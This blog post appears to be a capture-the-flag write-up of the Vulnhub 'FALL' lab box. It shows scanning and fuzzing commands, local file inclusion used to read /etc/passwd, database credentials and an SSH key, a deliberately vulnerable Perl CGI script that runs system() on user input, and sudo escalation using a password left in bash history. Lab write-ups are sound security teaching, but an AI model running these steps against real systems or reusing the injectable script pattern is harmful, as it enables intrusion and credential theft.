---
layout: post
title:  "Vulnhub | digitalworld.local: FALL"
date:   2024-06-13
description: FALL is an easy box from the digitalworld.local series. It hosts a web application that uses CMS Made Simple, where we discover an LFI vulnerability that allows us to read the SSH private key of the user on the box. Then, we find the user’s credentials in their bash history, which allows us to run sudo. The user had run ALL privileges on the box, so we jump straight to root.
tags: vulnhub lfi mysql cms-made-simple ssh-keys sudo
---

## Overview
[FALL](https://www.vulnhub.com/entry/digitalworldlocal-fall,726/) is an easy box from the digitalworld.local series.
It hosts a web application that uses CMS Made Simple, where we discover an LFI vulnerability that allows us to read the SSH private key of the user on the box. 
Then, we find the user’s credentials in their bash history, which allows us to run sudo. 
The user had run ALL privileges on the box, so we jump straight to root.

## Recon

### nmap

```
# Nmap 7.94SVN scan initiated Wed Jun 12 16:37:02 2024 as: nmap -p 22,80,111,139,443,445,3306,8000,8080,8443,9090,10080,10443 -sSCV -vv -oA scans/fall 192.168.107.133
Nmap scan report for 192.168.107.133 (192.168.107.133)
Host is up, received arp-response (0.00076s latency).
Scanned at 2024-06-12 16:37:09 +08 for 46s

PORT      STATE  SERVICE     REASON         VERSION
22/tcp    open   ssh         syn-ack ttl 64 OpenSSH 7.8 (protocol 2.0)
| ssh-hostkey: 
|   2048 c5:86:f9:64:27:a4:38:5b:8a:11:f9:44:4b:2a:ff:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBezJ/KDio6Fwya44wrK4/39Vd93TBRE3CC7En4GJYCcT89paKDGhozzWU7pAFV5FqWbBZ5Z9pJIGhVNvmIIYR1YoyTbkF3qbf41XBGCmI87nLqYxFXQys3iycBYah3qMxkr24N4SvU+OIOWItFQZSNCK3BzYlCnxFNVNh4JLqrI/Og40EP5Ck7REorRRIraefdROKDqZHPeugwV1UHbISjyDsKChbpobQxVl80RT1dszhuUU1BvhJl1sy/opLQWdRjsl97L1c0lc87AFcd6PgsGf6UFURN+1RaVngnZBFWWnYUb/HfCbKJGseTgATk+Fk5+IBOrlXJ4fQ9/SkagXL
|   256 e1:00:0b:cc:59:21:69:6c:1a:c1:77:22:39:5a:35:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAFLZltNl1U6p8d7Su4gH+FQmIRRpZlAuOHrQYHYdGeWADfzBXlPSDkCrItb9doE6+ACyru5Fm023LgiTNg8yGU=
|   256 1d:4e:14:6d:20:f4:56:da:65:83:6f:7d:33:9d:f0:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEeQTBvJOPKDtUv+nJyQJ9rKdAmrC577XXaTjRI+2n3c
80/tcp    open   http        syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Good Tech Inc's Fall Sales - Home
|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
111/tcp   closed rpcbind     reset ttl 64
139/tcp   open   netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp   open   ssl/http    syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
|_http-title: Good Tech Inc's Fall Sales - Home
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/organizationalUnitName=ca-2683772458131447713/emailAddress=root@localhost.localdomain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-08-15T03:51:33
| Not valid after:  2020-08-19T05:31:33
| MD5:   ac51:22da:893a:4d95:07ba:3e82:5780:bf24
| SHA-1: 8821:fdc6:7f1b:ac6a:2c7b:6a32:194d:ed44:b553:2cf4
| -----BEGIN CERTIFICATE-----
| MIIE4DCCAsigAwIBAgIIV5TaF3XKfxowDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV
| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMjY4Mzc3
| MjQ1ODEzMTQ0NzcxMzEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0xOTA4
| MTUwMzUxMzNaFw0yMDA4MTkwNTMxMzNaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK
| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKY2vdPnY38fq4HuMzEIZwz2PfMutxbg
| xdxMBJMk8eM9vwwMmDyiMuEMfy46w5gvCgo5zmq4VoQYKJxrcUIogiDqzLC/Pjfq
| jSvFooDih5naltrhaoZvTHlu8Q4G0TmwhaaYpedqkhPzVLHywkckVBu9P9unrrlI
| BI3+N3aZLTppsk1gTe67tUjhpeiMQKkYWhtgTG3upSAI9FjsB9LNhw8CyIM+VFHj
| 2YHFlvp+Jt1A+u+vMtfDm5A86/MpdeWpLKbLTjgNk0Q79VPU0UBnoSKcS2RwAVRM
| QkR3lLoOEGu/DLz84EQP1r9m5jLZX5p5Gc0qaa9/FG3ll9DLRL+gggsCAwEAAaNg
| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo
| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFNch7n7MGaSjmr7qLPAGmH5iWQnd
| MA0GCSqGSIb3DQEBCwUAA4ICAQBxLU3j7e5B47e3oO7dHrZrl6fTxAPORYcPWM19
| Qjwq4wBluFliGz918zGukOrDQdb2WEhbJj1X2SNsLhqa6i/nEi+GKQ7XzMwpOxTg
| vY3bFV1y550Uac/kj6lSXLIgRllLruuQOOLHsfz9BhTe5ZbSO0N20XhvHqhxbd6s
| EBqKZeSbnweXnHUeiev/7IceZaxoWHqJ4CfM1PUXnJZL+NuWGPAfzMfv5F7ap66T
| d1bc9xBvg9jbvP4RtmGT0QwpUTCpsXBLS3WuZjq9/jcxvyubwVfIidGCMGoiGNqy
| pHI+XgYH3f/9W56QgxuUIjctLTeU8v5YZlS7vw58whxaZ0j3xQd50RZ+YFPTXnsy
| L2oAOZ8Lb57SKMM/RKYju5cvSQjtTRz+KnHqZHwDA46b2WKOUONrlNvm7Hp0dICB
| RLfD150FOj8L914sNFh85M2Sj1BFHKDSNu9ootIZg0uUxwJNGrOuzY0vlRiAJTOA
| Sw3FNGWb1UWyAXjO1DGL2YEnW2phXMdml4MttR6HoDgw689ra0q67xNWRyNOEc00
| OdANMqq4PpF3W58/o8zRriePTQiGYltb95DUS5skFm/ScJ9PvElefLn5MkgnhKEC
| htGW8shfB4Rhc9r+03JJpflvJ48EtS/TikQNTyO4B9p1bEguRVbWzx6Tf/rLEYdb
| GBMBjA==
|_-----END CERTIFICATE-----
|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A
445/tcp   open   netbios-ssn syn-ack ttl 64 Samba smbd 4.8.10 (workgroup: SAMBA)
3306/tcp  open   mysql       syn-ack ttl 64 MySQL (unauthorized)
8000/tcp  closed http-alt    reset ttl 64
8080/tcp  closed http-proxy  reset ttl 64
8443/tcp  closed https-alt   reset ttl 64
9090/tcp  open   http        syn-ack ttl 64 Cockpit web service 162 - 188
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://192.168.107.133:9090/
10080/tcp closed amanda      reset ttl 64
10443/tcp closed cirrossp    reset ttl 64
MAC Address: 00:0C:29:7D:51:6E (VMware)
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 7h00m02s
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50309/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33900/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19732/udp): CLEAN (Timeout)
|   Check 4 (port 52453/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.8.10)
|   NetBIOS computer name: FALL\x00
|   Workgroup: SAMBA\x00
|_  System time: 2024-06-12T01:37:24-07:00
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 12 16:37:55 2024 -- 1 IP address (1 host up) scanned in 52.78 seconds
```

From the nmap scan, the order that I approached the box:

1. HTTP (port 80) and basic SMB enumeration
2. HTTP (port 9090)
3. If we find database credentials, try accessing mysql remotely.

### SMB
The SMB port was fried, so I moved on...

### HTTP (TCP 9090)

![fedora cockpit web console](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/fedora-cockpit.webp)

Port 9090 is hosting Fedora Server’s web console.
Quick check with default credentials didn’t net any results so we move on.

### HTTP (TCP 80)
![Home page](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/homepage.webp)

The web application uses CMS Made Simple version 2.2.15, and from the URL we see that it is using PHP.
A quick search online shows several vulnerabilities for this version, but none are applicable to this box.

## Local File Inclusion (LFI)
I tried fuzzing the different input fields to test for injection, while running directory fuzzing in the background.

```
$ ffuf -u 'http://192.168.107.133/FUZZ.php' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt
...[SNIP]...
test                    [Status: 200, Size: 80, Words: 3, Lines: 6, Duration: 38ms]
config                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 62ms]
index                   [Status: 200, Size: 8412, Words: 1138, Lines: 296, Duration: 277ms]
phpinfo                 [Status: 200, Size: 17, Words: 3, Lines: 2, Duration: 7ms]
```

Visiting `config.php` and `phpinfo.php` gives us empty pages.
When we visit `test.php` , we get a popup that it expects a GET parameter.

![test.php](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/testphp.webp)

Fuzzing the GET parameter, we find that it expects `file` .

```
$ ffuf -u 'http://192.168.107.133/test.php?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 80
...[SNIP]...
file                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 88ms]
```

Quick check for `/etc/passwd` confirms that we have a file read and the user qiu.
Trying to include a remote file did not work, so we only have an LFI here.

![/etc/passwd LFI](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/etcpasswd.webp)

From here, I enumerated the box for configuration files.

```
# /etc/os-release
NAME=Fedora
VERSION="28 (Server Edition)"
ID=fedora
VERSION_ID=28
VERSION_CODENAME=""
PLATFORM_ID="platform:f28"
PRETTY_NAME="Fedora 28 (Server Edition)"
ANSI_COLOR="0;34"
LOGO=fedora-logo-icon
CPE_NAME="cpe:/o:fedoraproject:fedora:28"
HOME_URL="https://fedoraproject.org/"
SUPPORT_URL="https://fedoraproject.org/wiki/Communicating_and_getting_help"
BUG_REPORT_URL="https://bugzilla.redhat.com/"
REDHAT_BUGZILLA_PRODUCT="Fedora"
REDHAT_BUGZILLA_PRODUCT_VERSION=28
REDHAT_SUPPORT_PRODUCT="Fedora"
REDHAT_SUPPORT_PRODUCT_VERSION=28
PRIVACY_POLICY_URL="https://fedoraproject.org/wiki/Legal:PrivacyPolicy"
VARIANT="Server Edition"
VARIANT_ID=server
```

The box is running Fedora 28 Server Edition.
This is useful, because Apache is installed under `httpd`.
However, because we don’t have information of the custom config file name, we move on from here.

Reading `config.php` gives us a set of database credentials.

```php
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = '127.0.0.1';
$config['db_username'] = 'cms_user';
$config['db_password'] = 'P@ssw0rdINSANITY';
$config['db_name'] = 'cms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Asia/Singapore';
$config['db_port'] = 3306;
```

However, we weren’t allowed to authenticate to the database remotely.

```
$ mysql -u cms_user -p'P@ssw0rdINSANITY' -h 192.168.107.133 -P 3306
ERROR 1130 (HY000): Host '192.168.107.131' is not allowed to connect to this MySQL server
```

## User as Qiu
At this point, I checked if I had read permissions on qiu’s directory. 
Reading qiu’s `.bashrc` succeeds.

![qiu's .bashrc](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/qiubashrc.webp)

From here, we can get an easy way onto the box if we can read qiu’s SSH keys.

![qiu's SSH key](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/qiusshkey.webp)

We can now log on to the box with qiu's key and get the user flag.

![User flag](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/userflag.webp)

## Root
Now that we’re on the box, I checked the database credentials, and we do have access. 
I found hashes for qiu and patrick, but they did not crack.

![cms hashes](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/cms_hashes.webp)

Checking `/var/www` , we find `terriblescript.pl` in `cgi-bin/` .

```perl
#!/usr/bin/perl -w

use strict;
use CGI ':standard';

print "Content-type: text/html\n\n";
my $file = param('file');
print "<P>You are previewing $file .";
system ("cat /var/www/html/$file");
```

If you somehow discovered this script during the web enumeration phase, you would have gained the LFI too.

Looking at qiu’s bash history, we see that they entered their credentials `remarkablyawesomeE` into the terminal.

```
[qiu@FALL ~]$ cat .bash_history
ls -al
cat .bash_history 
rm .bash_history
echo "remarkablyawesomE" | sudo -S dnf update
ifconfig
ping www.google.com
ps -aux
ps -ef | grep apache
env
env > env.txt
rm env.txt
lsof -i tcp:445
lsof -i tcp:80
ps -ef
lsof -p 1930
lsof -p 2160
rm .bash_history
exit
ls -al
cat .bash_history
exit
```

This allows us to run `sudo -l` to check if qiu can run any sudo commands.

![sudo -l](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/sudocheck.webp)

qiu is allowed to run any sudo commands as shown by `(ALL) ALL`.
With that, we can switch to the root user directly and retrieve the root flag.

![Root flag](/assets/img/2024-06-13-vulnhub-digitalworld-local-fall/rootflag.webp)
